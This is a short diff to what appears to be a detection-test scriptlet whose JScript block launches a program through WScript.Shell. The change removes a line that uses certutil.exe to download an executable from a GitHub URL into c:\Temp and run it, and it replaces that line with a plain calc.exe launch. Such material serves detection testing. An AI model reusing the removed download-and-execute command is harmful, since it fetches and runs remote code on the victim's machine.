@@ -15,7 +15,7 @@
 		<![CDATA[
 	    		// calc.exe should launch, this could be any arbitrary code.
       	   		// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
-			var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://github.com/void010/dummy/raw/main/cpp_poc_64.exe c:\Temp\cpp_poc.exe & start c:\Temp\cpp_poc.exe");	
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
 	
 		]]>
 </script>
